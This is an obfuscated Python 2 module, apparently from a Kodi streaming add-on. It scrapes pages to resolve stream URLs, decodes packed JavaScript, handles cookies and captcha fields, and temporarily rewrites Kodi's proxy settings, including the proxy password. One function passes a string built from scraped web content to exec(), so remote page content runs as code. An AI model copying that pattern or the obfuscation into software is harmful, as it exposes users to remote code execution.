       iiI1Ii1 = cookielib . Cookie ( version = 0 , name = iii11i1IIII , value = Ii , port = None , port_specified = False , domain = o00 , domain_specified = False , domain_initial_dot = False , path = '/' , path_specified = True , secure = False , expires = None , discard = True , comment = None , comment_url = None , rest = { 'HttpOnly' : None } , rfc2109 = False )
       cookieJar . set_cookie ( iiI1Ii1 )
     if 'origin' in IiIiII1 :
      IIiiIiI1 . add_header ( 'Origin' , IiIiII1 [ 'origin' ] )
     if O00OoOO0oo0 :
      O00OoOO0oo0 = O00OoOO0oo0 . split ( '&' )
      for i1i1iII1 in O00OoOO0oo0 :
       iii11i1IIII , Ii = i1i1iII1 . split ( '=' )
       IIiiIiI1 . add_header ( iii11i1IIII , Ii )
     if not cookieJar == None :
      if 18 - 18: iIiiiI1IiI1I1 / O0oO
      IiII = urllib2 . HTTPCookieProcessor ( cookieJar )
      O00 = urllib2 . build_opener ( IiII , urllib2 . HTTPBasicAuthHandler ( ) , urllib2 . HTTPHandler ( ) )
      O00 = urllib2 . install_opener ( O00 )
      print 'noredirect' , 'noredirect' in IiIiII1
      if 7 - 7: II1 . O0oO
      if 'noredirect' in IiIiII1 :
       O000OOO0OOo = urllib2 . build_opener ( I1IiiI )
       O00 = urllib2 . install_opener ( O000OOO0OOo )
       if 32 - 32: oO0o0ooO0 * OOO0O0O0ooooo
     if 'connection' in IiIiII1 :
      print '..........................connection//////.' , IiIiII1 [ 'connection' ]
      from keepalive import HTTPHandler
      O00oOo00o0o = HTTPHandler ( )
      O00 = urllib2 . build_opener ( O00oOo00o0o )
      urllib2 . install_opener ( O00 )
      if 85 - 85: IIII + II1 * IIII - o0oO0 % i11iIiiIii
      if 71 - 71: OoOO - i11Ii11I1Ii1i / OOooOOo * OOooOOo / O00ooooo00 . O00ooooo00
      if 53 - 53: o0oO0
     i11iiI1111 = None
     if 97 - 97: IiIIi1I1Iiii * IIiIiII11i . IIii1I
     if 'post' in IiIiII1 :
      I1Ii1111iIi = IiIiII1 [ 'post' ]
      if '$LiveStreamRecaptcha' in I1Ii1111iIi :
       ( I11o0oO00oO0o0o0 , I1Iooooo ) = i11IIIiI1I ( IiIiII1 [ 'page' ] )
       if I11o0oO00oO0o0o0 :
        I1Ii1111iIi += 'recaptcha_challenge_field:' + I11o0oO00oO0o0o0 + ',recaptcha_response_field:' + I1Iooooo
      o0iiiI1I1iIIIi1 = I1Ii1111iIi . split ( ',' ) ;
      i11iiI1111 = { }
      for Iii in o0iiiI1I1iIIIi1 :
       iii11i1IIII = Iii . split ( ':' ) [ 0 ] ;
       Ii = Iii . split ( ':' ) [ 1 ] ;
       i11iiI1111 [ iii11i1IIII ] = Ii
      i11iiI1111 = urllib . urlencode ( i11iiI1111 )
      if 19 - 19: o00O0oo % iIiiiI1IiI1I1 / i11iIiiIii / IIII - II1
     if 'rawpost' in IiIiII1 :
      i11iiI1111 = IiIiII1 [ 'rawpost' ]
      if '$LiveStreamRecaptcha' in i11iiI1111 :
       ( I11o0oO00oO0o0o0 , I1Iooooo ) = i11IIIiI1I ( IiIiII1 [ 'page' ] )
       if I11o0oO00oO0o0o0 :
        i11iiI1111 += '&recaptcha_challenge_field=' + I11o0oO00oO0o0o0 + '&recaptcha_response_field=' + I1Iooooo
     if i11iiI1111 :
      iiIiIIi = urllib2 . urlopen ( IIiiIiI1 , i11iiI1111 )
     else :
      iiIiIIi = urllib2 . urlopen ( IIiiIiI1 )
      if 37 - 37: o0000oOoOoO0o / II1 - i11iIiiIii
     ii111IiiI1 = iiIiIIi . read ( )
     if 18 - 18: IIII . IIiIiII11i
     if 'proxy' in IiIiII1 and not oOOOOoo is None :
      urllib2 . install_opener ( urllib2 . build_opener ( oOOOOoo ) )
      if 40 - 40: OOO0O0O0ooooo - II1 - O0oO
     ii111IiiI1 = iIiii ( ii111IiiI1 )
     if 76 - 76: IIiIiII11i . i11Ii11I1Ii1i - OoOO - IIII * Ooo00oOo00o
     if 'includeheaders' in IiIiII1 :
      if 54 - 54: O0oO + OOO0O0O0ooooo + o00O0oo * o0oO0 - o0000oOoOoO0o % OoOO0ooOOoo0O
      ii111IiiI1 += '$$HEADERS_START$$:'
      for iII in iiIiIIi . headers :
       ii111IiiI1 += iII + ':' + iiIiIIi . headers . get ( iII ) + '\n'
      ii111IiiI1 += '$$HEADERS_END$$:'
      if 13 - 13: i11Ii11I1Ii1i / IIII * Ooo00oOo00o . Ooo00oOo00o * i11Ii11I1Ii1i
     i1IIiiiii ( ii111IiiI1 )
     i1IIiiiii ( cookieJar )
     if 63 - 63: o0oO0 / OOO0O0O0ooooo * IiIIi1I1Iiii + iIiiiI1IiI1I1 / O0oO + oO0o0ooO0
     iiIiIIi . close ( )
     cachedPages [ IiIiII1 [ 'page' ] ] = ii111IiiI1
     if 63 - 63: Ooo00oOo00o + OoOO . o0oO0 % o0oO0
     if 57 - 57: iIiiiI1IiI1I1
     if 54 - 54: IiIIi1I1Iiii + OoOO0ooOOoo0O + i11iIiiIii
     if forCookieJarOnly :
      return cookieJar
    elif IiIiII1 [ 'page' ] and not IiIiII1 [ 'page' ] . startswith ( 'http' ) :
     if IiIiII1 [ 'page' ] . startswith ( '$pyFunction:' ) :
      i1i1ii111 = IiI1ioO0oOOoo00000 ( IiIiII1 [ 'page' ] . split ( '$pyFunction:' ) [ 1 ] , '' , cookieJar , IiIiII1 )
      if forCookieJarOnly :
       return cookieJar
      ii111IiiI1 = i1i1ii111
     else :
      ii111IiiI1 = IiIiII1 [ 'page' ]
   if '$pyFunction:playmedia(' in IiIiII1 [ 'expres' ] or 'ActivateWindow' in IiIiII1 [ 'expres' ] or '$PLAYERPROXY$=' in url or any ( x in url for x in Oo0Ooo ) :
    oOoOO = False
   if '$doregex' in IiIiII1 [ 'expres' ] :
    IiIiII1 [ 'expres' ] = iiI11i1II ( regexs , IiIiII1 [ 'expres' ] , cookieJar , recursiveCall = True , cachedPages = cachedPages )
   if not IiIiII1 [ 'expres' ] == '' :
    print 'doing it ' , IiIiII1 [ 'expres' ]
    if '$LiveStreamCaptcha' in IiIiII1 [ 'expres' ] :
     i1i1ii111 = oOo00 ( IiIiII1 , ii111IiiI1 , cookieJar )
     if 3 - 3: IIII % O00ooooo00
     url = url . replace ( "$doregex[" + Ii1i1 + "]" , i1i1ii111 )
    elif IiIiII1 [ 'expres' ] . startswith ( '$pyFunction:' ) or '#$pyFunction' in IiIiII1 [ 'expres' ] :
     if 46 - 46: iIiiiI1IiI1I1 % ii11ii1ii % IIii1I - IiIIi1I1Iiii . II1 - O0oO
     if IiIiII1 [ 'expres' ] . startswith ( '$pyFunction:' ) :
      i1i1ii111 = IiI1ioO0oOOoo00000 ( IiIiII1 [ 'expres' ] . split ( '$pyFunction:' ) [ 1 ] , ii111IiiI1 , cookieJar , IiIiII1 )
     else :
      i1i1ii111 = o00ooO00O ( IiIiII1 [ 'expres' ] , ii111IiiI1 , cookieJar , IiIiII1 )
     if 'ActivateWindow' in IiIiII1 [ 'expres' ] : return
     print 'url k val' , url , Ii1i1 , i1i1ii111
     if 68 - 68: i11iIiiIii + oO0o0ooO0
     url = url . replace ( "$doregex[" + Ii1i1 + "]" , i1i1ii111 )
    else :
     if 'listrepeat' in IiIiII1 :
      oOOoo0o0OOOO = IiIiII1 [ 'listrepeat' ]
      i1IiII1III = re . findall ( IiIiII1 [ 'expres' ] , ii111IiiI1 )
      return oOOoo0o0OOOO , i1IiII1III , IiIiII1 , regexs
      if 30 - 30: OOO0O0O0ooooo
     if not ii111IiiI1 == '' :
      if 99 - 99: iIiiiI1IiI1I1 * O0oO % IIii1I / oO0o0ooO0
      OOO00O0oOOo = re . compile ( IiIiII1 [ 'expres' ] ) . search ( ii111IiiI1 )
      i1i1ii111 = ''
      try :
       i1i1ii111 = OOO00O0oOOo . group ( 1 ) . strip ( )
      except : traceback . print_exc ( )
     else :
      i1i1ii111 = IiIiII1 [ 'expres' ]
      if 71 - 71: o00O0oo / ii11ii1ii / o0oO0 % o0000oOoOoO0o
     if rawPost :
      print 'rawpost'
      i1i1ii111 = urllib . quote_plus ( i1i1ii111 )
     if 'htmlunescape' in IiIiII1 :
      if 51 - 51: O0oO * OOO0O0O0ooooo / iIiiiI1IiI1I1 . oO0o0ooO0 % o0000oOoOoO0o / IIiIiII11i
      import HTMLParser
      i1i1ii111 = HTMLParser . HTMLParser ( ) . unescape ( i1i1ii111 )
     url = url . replace ( "$doregex[" + Ii1i1 + "]" , i1i1ii111 )
     if 9 - 9: IIiIiII11i % IIiIiII11i % iIiiiI1IiI1I1
   else :
    url = url . replace ( "$doregex[" + Ii1i1 + "]" , '' )
 if '$epoctime$' in url :
  url = url . replace ( '$epoctime$' , oOOO0oo0 ( ) )
 if '$epoctime2$' in url :
  url = url . replace ( '$epoctime2$' , ii1iIi1iIiI1i ( ) )
  if 30 - 30: O0oO + o0oO0 - O0oO . O0oO - iIiiiI1IiI1I1 + OOO0O0O0ooooo
 if '$GUID$' in url :
  import uuid
  url = url . replace ( '$GUID$' , str ( uuid . uuid1 ( ) ) . upper ( ) )
 if '$get_cookies$' in url :
  url = url . replace ( '$get_cookies$' , oOO0 ( cookieJar ) )
  if 46 - 46: oO0o0ooO0 % OOooOOo
 if recursiveCall : return url
 print 'final url' , url
 if url == "" :
  return
 else :
  return url , oOoOO
def ooo0o0O0o ( t ) :
 import hashlib
 i1i1iII1 = hashlib . md5 ( )
 i1i1iII1 . update ( t )
 return i1i1iII1 . hexdigest ( )
 if 62 - 62: i11Ii11I1Ii1i + i11iIiiIii + IiIIi1I1Iiii / i11iIiiIii
def I1Ii ( encrypted ) :
 oOO = ""
 print 'enc' , encrypted
 if 17 - 17: iIiiiI1IiI1I1 / OoOO % O0oO + IIiIiII11i * o0oO0
 if 36 - 36: o0oO0 * Ooo00oOo00o
 if 23 - 23: o00O0oo . II1 - o0000oOoOoO0o + O0oO . iIiiiI1IiI1I1
 if 54 - 54: i11Ii11I1Ii1i
def O0 ( media_url ) :
 try :
  import CustomPlayer
  iIi1IiII = CustomPlayer . MyXBMCPlayer ( )
  I1i = xbmcgui . ListItem ( label = str ( IiI1 ) , iconImage = "DefaultVideo.png" , thumbnailImage = xbmc . getInfoImage ( "ListItem.Thumb" ) , path = media_url )
  iIi1IiII . play ( media_url , I1i )
  xbmc . sleep ( 1000 )
  while iIi1IiII . is_active :
   xbmc . sleep ( 200 )
 except :
  traceback . print_exc ( )
 return ''
 if 72 - 72: IIii1I
def iiIi ( params ) :
 ooOoo0O = json . dumps ( params )
 oOIi111 = xbmc . executeJSONRPC ( ooOoo0O )
 if 67 - 67: OOO0O0O0ooooo
 try :
  iiIiIIi = json . loads ( oOIi111 )
 except UnicodeDecodeError :
  iiIiIIi = json . loads ( oOIi111 . decode ( 'utf-8' , 'ignore' ) )
  if 52 - 52: iIiiiI1IiI1I1 . i11Ii11I1Ii1i / OOooOOo / II1 . i11iIiiIii
 try :
  if 'result' in iiIiIIi :
   return iiIiIIi [ 'result' ]
  return None
 except KeyError :
  logger . warn ( "[%s] %s" % ( params [ 'method' ] , iiIiIIi [ 'error' ] [ 'message' ] ) )
  return None
  if 30 - 30: o00O0oo / oO0o0ooO0 . O0oO . II1 - IiIIi1I1Iiii
  if 44 - 44: OOO0O0O0ooooo * II1 % i11Ii11I1Ii1i + iIiiiI1IiI1I1
def II1i1i1iII1 ( proxysettings = None ) :
 if 68 - 68: IiIIi1I1Iiii + i11iIiiIii
 if proxysettings == None :
  print 'proxy set to nothing'
  xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":false}, "id":1}' )
 else :
  if 69 - 69: IIii1I * IIii1I * i11iIiiIii + IIiIiII11i / o0000oOoOoO0o % oO0o0ooO0
  O0OO0oOoO0O0O = proxysettings . split ( ':' )
  oo000oOo0 = O0OO0oOoO0O0O [ 0 ]
  iIiI1I1Ii = O0OO0oOoO0O0O [ 1 ]
  III = O0OO0oOoO0O0O [ 2 ]
  iIiIi11Ii = None
  iIII1i1i = None
  if 35 - 35: iIiiiI1IiI1I1 * o00O0oo - II1 . o00O0oo . o00O0oo
  if len ( O0OO0oOoO0O0O ) > 3 and '@' in proxysettings :
   iIiIi11Ii = O0OO0oOoO0O0O [ 3 ]
   iIII1i1i = proxysettings . split ( '@' ) [ - 1 ]
   if 11 - 11: o0oO0 / OOooOOo + o00O0oo % IIii1I
  print 'proxy set to' , III , oo000oOo0 , iIiI1I1Ii
  xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.usehttpproxy", "value":true}, "id":1}' )
  xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxytype", "value":' + str ( III ) + '}, "id":1}' )
  xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyserver", "value":"' + str ( oo000oOo0 ) + '"}, "id":1}' )
  xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyport", "value":' + str ( iIiI1I1Ii ) + '}, "id":1}' )
  if 42 - 42: OoOO * OOooOOo % i11Ii11I1Ii1i - OOooOOo . i11iIiiIii - o0oO0
  if 84 - 84: o0oO0 - OoOO / o00O0oo
  if not iIiIi11Ii == None :
   xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxyusername", "value":"' + str ( iIiIi11Ii ) + '"}, "id":1}' )
   xbmc . executeJSONRPC ( '{"jsonrpc":"2.0", "method":"Settings.SetSettingValue", "params":{"setting":"network.httpproxypassword", "value":"' + str ( iIII1i1i ) + '"}, "id":1}' )
   if 13 - 13: O0oO - IiIIi1I1Iiii - i11Ii11I1Ii1i
   if 92 - 92: i11Ii11I1Ii1i / OOooOOo * Ooo00oOo00o . o00O0oo % iIiiiI1IiI1I1
def O0OoOoO00O ( ) :
 OooOOO0O00 = iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.usehttpproxy" } , 'id' : 1 } ) [ 'value' ]
 print 'proxyActive' , OooOOO0O00
 III = iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.httpproxytype" } , 'id' : 1 } ) [ 'value' ]
 if 29 - 29: ii11ii1ii % IIii1I . II1 % II1 % iIiiiI1IiI1I1 / IIII
 if OooOOO0O00 :
  oo000oOo0 = iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.httpproxyserver" } , 'id' : 1 } ) [ 'value' ]
  iIiI1I1Ii = unicode ( iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.httpproxyport" } , 'id' : 1 } ) [ 'value' ] )
  iIiIi11Ii = iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.httpproxyusername" } , 'id' : 1 } ) [ 'value' ]
  iIII1i1i = iiIi ( { 'jsonrpc' : '2.0' , "method" : "Settings.GetSettingValue" , "params" : { "setting" : "network.httpproxypassword" } , 'id' : 1 } ) [ 'value' ]
  if 70 - 70: i11iIiiIii % IIII
  if iIiIi11Ii and iIII1i1i and oo000oOo0 and iIiI1I1Ii :
   return oo000oOo0 + ':' + str ( iIiI1I1Ii ) + ':' + str ( III ) + ':' + iIiIi11Ii + '@' + iIII1i1i
  elif oo000oOo0 and iIiI1I1Ii :
   return oo000oOo0 + ':' + str ( iIiI1I1Ii ) + ':' + str ( III )
 else :
  return None
  if 11 - 11: O0oO % OoOO % oO0o0ooO0 / iIiiiI1IiI1I1 % o0oO0 - IiIIi1I1Iiii
def OOooO ( media_url , name , iconImage , proxyip , port ) :
 if 79 - 79: o0oO0 % OoOO0ooOOoo0O % ii11ii1ii % oO0o0ooO0 - iIiiiI1IiI1I1 * II1
 oOOO = xbmcgui . DialogProgress ( )
 oOOO . create ( 'Progress' , 'Playing with custom proxy' )
 oOOO . update ( 10 , "" , "setting proxy.." , "" )
 ooo0oooo0 = False
 OOO0ooo = ''
 try :
  if 7 - 7: ii11ii1ii + O00ooooo00 . IIiIiII11i / IiIIi1I1Iiii
  OOO0ooo = O0OoOoO00O ( )
  print 'existing_proxy' , OOO0ooo
  if 22 - 22: i11Ii11I1Ii1i - i11Ii11I1Ii1i % o0000oOoOoO0o . o0oO0 + OoOO0ooOOoo0O
  II1i1i1iII1 ( proxyip + ':' + port + ':0' )
  if 63 - 63: IIiIiII11i % o0oO0 * ii11ii1ii + o0oO0 / IiIIi1I1Iiii % IIII
  print 'proxy setting complete' , O0OoOoO00O ( )
  ooo0oooo0 = True
  oOOO . update ( 80 , "" , "setting proxy complete, now playing" , "" )
  oOOO . close ( )
  oOOO = None
  import CustomPlayer
  iIi1IiII = CustomPlayer . MyXBMCPlayer ( )
  I1i = xbmcgui . ListItem ( label = str ( name ) , iconImage = iconImage , thumbnailImage = xbmc . getInfoImage ( "ListItem.Thumb" ) , path = media_url )
  iIi1IiII . play ( media_url , I1i )
  xbmc . sleep ( 1000 )
  while iIi1IiII . is_active :
   xbmc . sleep ( 200 )
 except :
  traceback . print_exc ( )
 if oOOO :
  oOOO . close ( )
 if ooo0oooo0 :
  print 'now resetting the proxy back'
  II1i1i1iII1 ( OOO0ooo )
  print 'reset here'
 return ''
 if 45 - 45: O0oO
 if 20 - 20: II1 * ii11ii1ii * OOO0O0O0ooooo . o0000oOoOoO0o
def OoO000O ( page_value , referer = None ) :
 if referer :
  referer = [ ( 'Referer' , referer ) ]
 if page_value . startswith ( "http" ) :
  OOoiIIiiIIIi1I = page_value
  page_value = o0OoOO ( page_value , headers = referer )
  if 65 - 65: OoOO % OOO0O0O0ooooo % IIii1I * oO0o0ooO0
 iIIIIIiI1I1 = "(eval\(function\(p,a,c,k,e,(?:r|d).*)"
 if 15 - 15: oO0o0ooO0 * IiIIi1I1Iiii % OoOO * IIii1I - i11iIiiIii
 Oo00OOOOoo0oo = re . compile ( iIIIIIiI1I1 ) . findall ( page_value )
 O00OOooo0Ooo = ""
 if Oo00OOOOoo0oo and len ( Oo00OOOOoo0oo ) > 0 :
  for Ii in Oo00OOOOoo0oo :
   o0oOOoOOO = iiI1i11II ( Ii )
   II11 = IiI111111IIII ( o0oOOoOOO , '\'(.*?)\'' )
   if 'unescape' in o0oOOoOOO :
    o0oOOoOOO = urllib . unquote ( II11 )
   O00OOooo0Ooo += o0oOOoOOO + '\n'
  print 'final value is ' , O00OOooo0Ooo
  if 15 - 15: O0oO / OOO0O0O0ooooo . ii11ii1ii . i11iIiiIii
  OOoiIIiiIIIi1I = IiI111111IIII ( O00OOooo0Ooo , 'src="(.*?)"' )
  if 59 - 59: o0oO0 - ii11ii1ii - i11Ii11I1Ii1i
  page_value = o0OoOO ( OOoiIIiiIIIi1I , headers = referer )
  if 48 - 48: O00ooooo00 + o00O0oo % OOooOOo / IiIIi1I1Iiii - ii11ii1ii
  if 67 - 67: OoOO0ooOOoo0O % ii11ii1ii . II1 + o0000oOoOoO0o * o00O0oo * OOooOOo
  if 36 - 36: OOO0O0O0ooooo + IiIIi1I1Iiii
 iIIIi1i1I11i = IiI111111IIII ( page_value , 'streamer\'.*?\'(.*?)\'\)' )
 oOO0OO0OO = IiI111111IIII ( page_value , 'file\',\s\'(.*?)\'' )
 if 87 - 87: OoOO0ooOOoo0O + IIii1I - II1
 if 8 - 8: II1 / o00O0oo + O00ooooo00 . IIII
 return iIIIi1i1I11i + ' playpath=' + oOO0OO0OO + ' pageUrl=' + OOoiIIiiIIIi1I
 if 73 - 73: O00ooooo00 + IIII . i11iIiiIii
def IIioo0OO ( page_value , referer = None ) :
 if referer :
  referer = [ ( 'Referer' , referer ) ]
 if page_value . startswith ( "http" ) :
  page_value = o0OoOO ( page_value , headers = referer )
 iIIIIIiI1I1 = "var a = (.*?);\s*var b = (.*?);\s*var c = (.*?);\s*var d = (.*?);\s*var f = (.*?);\s*var v_part = '(.*?)';"
 Oo00OOOOoo0oo = re . compile ( iIIIIIiI1I1 ) . findall ( page_value ) [ 0 ]
 if 2 - 2: iIiiiI1IiI1I1 - Ooo00oOo00o . O0oO * IIII / OoOO0ooOOoo0O
 OOo0 , iII , iiIii1IIi , ii1IiIiI1 , OOOoOo00O , Ii = ( Oo00OOOOoo0oo )
 OOOoOo00O = int ( OOOoOo00O )
 OOo0 = int ( OOo0 ) / OOOoOo00O
 iII = int ( iII ) / OOOoOo00O
 iiIii1IIi = int ( iiIii1IIi ) / OOOoOo00O
 ii1IiIiI1 = int ( ii1IiIiI1 ) / OOOoOo00O
 if 59 - 59: o0000oOoOoO0o % IIii1I . O00ooooo00 + iIiiiI1IiI1I1 * O0oO
 i1IiII1III = 'rtmp://' + str ( OOo0 ) + '.' + str ( iII ) + '.' + str ( iiIii1IIi ) + '.' + str ( ii1IiIiI1 ) + Ii ;
 return i1IiII1III
 if 41 - 41: oO0o0ooO0 % OoOO
def i1iIiIi1I ( url , useragent = None ) :
 str = '#EXTM3U'
 str += '\n#EXT-X-STREAM-INF:PROGRAM-ID=1,BANDWIDTH=361816'
 str += '\n' + url + '&bytes=0-200000'
 oO = os . path . join ( Oooo0000 , 'testfile.m3u' )
 str += '\n'
 i1I1IIIiiI ( oO , str )
 if 71 - 71: o0000oOoOoO0o * Ooo00oOo00o % II1 % Ooo00oOo00o / IIiIiII11i
 return oO
 if 56 - 56: II1 % i11iIiiIii * IIii1I . Ooo00oOo00o * OOO0O0O0ooooo
def i1I1IIIiiI ( file_name , page_data , append = False ) :
 if append :
  OOOoOo00O = open ( file_name , 'a' )
  OOOoOo00O . write ( page_data )
  OOOoOo00O . close ( )
 else :
  OOOoOo00O = open ( file_name , 'wb' )
  OOOoOo00O . write ( page_data )
  OOOoOo00O . close ( )
  return ''
  if 23 - 23: i11iIiiIii
def II1I11IIi ( file_name ) :
 OOOoOo00O = open ( file_name , 'rb' )
 ii1IiIiI1 = OOOoOo00O . read ( )
 OOOoOo00O . close ( )
 return ii1IiIiI1
 if 66 - 66: i11iIiiIii / ii11ii1ii - II1 / O00ooooo00 . i11iIiiIii
def IIIII1iii11 ( page_data ) :
 import re , base64 , urllib ;
 IIi1I = page_data
 while 'geh(' in IIi1I :
  if IIi1I . startswith ( 'lol(' ) : IIi1I = IIi1I [ 5 : - 1 ]
  if 27 - 27: OOO0O0O0ooooo . o0oO0 / IIII
  IIi1I = re . compile ( '"(.*?)"' ) . findall ( IIi1I ) [ 0 ] ;
  IIi1I = base64 . b64decode ( IIi1I ) ;
  IIi1I = urllib . unquote ( IIi1I ) ;
 print IIi1I
 return IIi1I
 if 96 - 96: OoOO % i11Ii11I1Ii1i % oO0o0ooO0 - i11Ii11I1Ii1i % OOooOOo + OoOO
def iIOo0O ( page_data ) :
 print 'get_dag_url2' , page_data
 Ii11 = o0OoOO ( page_data ) ;
 II1i111 = '(http.*)'
 import uuid
 i1iiiIii11 = str ( uuid . uuid1 ( ) ) . upper ( )
 OOoOOO000O0 = re . compile ( II1i111 ) . findall ( Ii11 )
 oOo0 = [ ( 'X-Playback-Session-Id' , i1iiiIii11 ) ]
 for II1i11I1 in OOoOOO000O0 :
  try :
   iiIiIiII = o0OoOO ( II1i11I1 , headers = oOo0 ) ;
   if 37 - 37: o00O0oo / O0oO + iIiiiI1IiI1I1
  except : pass
  if 18 - 18: OoOO
 return page_data + '|&X-Playback-Session-Id=' + i1iiiIii11
 if 23 - 23: iIiiiI1IiI1I1
 if 24 - 24: IIii1I + IIii1I * IIII
def i1I11iIII1i1I ( page_data ) :
 print 'get_dag_url' , page_data
 if page_data . startswith ( 'http://dag.total-stream.net' ) :
  oOo0 = [ ( 'User-Agent' , 'Verismo-BlackUI_(2.4.7.5.8.0.34)' ) ]
  page_data = o0OoOO ( page_data , headers = oOo0 ) ;
  if 63 - 63: IiIIi1I1Iiii + o0oO0 - iIiiiI1IiI1I1
 if '127.0.0.1' in page_data :
  return i1iIIi1I1I11 ( page_data )
 elif IiI111111IIII ( page_data , 'wmsAuthSign%3D([^%&]+)' ) != '' :
  iii1III1i = IiI111111IIII ( page_data , '&ver_t=([^&]+)&' ) + '?wmsAuthSign=' + IiI111111IIII ( page_data , 'wmsAuthSign%3D([^%&]+)' ) + '==/mp4:' + IiI111111IIII ( page_data , '\\?y=([^&]+)&' )
 else :
  iii1III1i = IiI111111IIII ( page_data , 'href="([^"]+)"[^"]+$' )
  if len ( iii1III1i ) == 0 :
   iii1III1i = page_data
 iii1III1i = iii1III1i . replace ( ' ' , '%20' )
 return iii1III1i
 if 17 - 17: iIiiiI1IiI1I1 / iIiiiI1IiI1I1
def IiI111111IIII ( data , re_patten ) :
 OOooOoooOoOo = ''
 IiIiII1 = re . search ( re_patten , data )
 if IiIiII1 != None :
  OOooOoooOoOo = IiIiII1 . group ( 1 )
 else :
  OOooOoooOoOo = ''
 return OOooOoooOoOo
 if 65 - 65: O0oO + IiIIi1I1Iiii
def i1iIIi1I1I11 ( page_data ) :
 iii1III1i = ''
 if '127.0.0.1' in page_data :
  iii1III1i = IiI111111IIII ( page_data , '&ver_t=([^&]+)&' ) + ' live=true timeout=15 playpath=' + IiI111111IIII ( page_data , '\\?y=([a-zA-Z0-9-_\\.@]+)' )
  if 59 - 59: II1 + o00O0oo . o0oO0 - OOO0O0O0ooooo % IIii1I / OOO0O0O0ooooo
 if IiI111111IIII ( page_data , 'token=([^&]+)&' ) != '' :
  iii1III1i = iii1III1i + '?token=' + IiI111111IIII ( page_data , 'token=([^&]+)&' )
 elif IiI111111IIII ( page_data , 'wmsAuthSign%3D([^%&]+)' ) != '' :
  iii1III1i = IiI111111IIII ( page_data , '&ver_t=([^&]+)&' ) + '?wmsAuthSign=' + IiI111111IIII ( page_data , 'wmsAuthSign%3D([^%&]+)' ) + '==/mp4:' + IiI111111IIII ( page_data , '\\?y=([^&]+)&' )
 else :
  iii1III1i = IiI111111IIII ( page_data , 'HREF="([^"]+)"' )
  if 88 - 88: IiIIi1I1Iiii . OOO0O0O0ooooo % II1 / o0000oOoOoO0o
 if 'dag1.asx' in iii1III1i :
  return i1I11iIII1i1I ( iii1III1i )
  if 89 - 89: iIiiiI1IiI1I1 / OoOO0ooOOoo0O
 if 'devinlivefs.fplive.net' not in iii1III1i :
  iii1III1i = iii1III1i . replace ( 'devinlive' , 'flive' )
 if 'permlivefs.fplive.net' not in iii1III1i :
  iii1III1i = iii1III1i . replace ( 'permlive' , 'flive' )
 return iii1III1i
 if 14 - 14: o0000oOoOoO0o . IIiIiII11i * i11Ii11I1Ii1i + iIiiiI1IiI1I1 - i11Ii11I1Ii1i + o0000oOoOoO0o
 if 18 - 18: OoOO0ooOOoo0O - ii11ii1ii - IIiIiII11i - IIiIiII11i
def OOooo00 ( str_eval ) :
 i1oO = ""
 try :
  iIIi1IIi = "w,i,s,e=(" + str_eval + ')'
  exec ( iIIi1IIi )
  i1oO = i111i11I1ii ( w , OOO00 , s , e )
 except : traceback . print_exc ( file = sys . stdout )
 if 64 - 64: OoOO0ooOOoo0O / i11iIiiIii / ii11ii1ii . II1
 return i1oO
 if 11 - 11: o00O0oo % O00ooooo00
def i111i11I1ii ( w , i , s , e ) :
 ii11I1 = 0 ;
 Ii1iIi111i1i1 = 0 ;
 IIOO0ooOo0OoOo0 = 0 ;
 oOo = [ ] ;
 i1i = [ ] ;
 while True :
  if ( ii11I1 < 5 ) :
   i1i . append ( w [ ii11I1 ] )
  elif ( ii11I1 < len ( w ) ) :
   oOo . append ( w [ ii11I1 ] ) ;
  ii11I1 += 1 ;
  if ( Ii1iIi111i1i1 < 5 ) :
   i1i . append ( i [ Ii1iIi111i1i1 ] )
  elif ( Ii1iIi111i1i1 < len ( i ) ) :
   oOo . append ( i [ Ii1iIi111i1i1 ] )
  Ii1iIi111i1i1 += 1 ;
  if ( IIOO0ooOo0OoOo0 < 5 ) :
   i1i . append ( s [ IIOO0ooOo0OoOo0 ] )
  elif ( IIOO0ooOo0OoOo0 < len ( s ) ) :
   oOo . append ( s [ IIOO0ooOo0OoOo0 ] ) ;
  IIOO0ooOo0OoOo0 += 1 ;
  if ( len ( w ) + len ( i ) + len ( s ) + len ( e ) == len ( oOo ) + len ( i1i ) + len ( e ) ) :
   break ;
   if 5 - 5: OoOO + OOO0O0O0ooooo + OOO0O0O0ooooo . o0oO0 - i11Ii11I1Ii1i
 o00oo0000 = '' . join ( oOo )
 iIi1IIi1ii = '' . join ( i1i )
 Ii1iIi111i1i1 = 0 ;
 I11Ii = [ ] ;
 for ii11I1 in range ( 0 , len ( oOo ) , 2 ) :
  if 16 - 16: IiIIi1I1Iiii / i11iIiiIii
  oo00 = - 1 ;
  if ( ord ( iIi1IIi1ii [ Ii1iIi111i1i1 ] ) % 2 ) :
   oo00 = 1 ;
   if 24 - 24: ii11ii1ii - ii11ii1ii + OoOO + IIiIiII11i - OoOO0ooOOoo0O
  I11Ii . append ( chr ( int ( o00oo0000 [ ii11I1 : ii11I1 + 2 ] , 36 ) - oo00 ) ) ;
  Ii1iIi111i1i1 += 1 ;
  if ( Ii1iIi111i1i1 >= len ( i1i ) ) :
   Ii1iIi111i1i1 = 0 ;
 i1IiII1III = '' . join ( I11Ii )
 if 'eval(function(w,i,s,e)' in i1IiII1III :
  print 'STILL GOing'
  i1IiII1III = re . compile ( 'eval\(function\(w,i,s,e\).*}\((.*?)\)' ) . findall ( i1IiII1III ) [ 0 ]
  return OOooo00 ( i1IiII1III )
 else :
  print 'FINISHED'
  return i1IiII1III
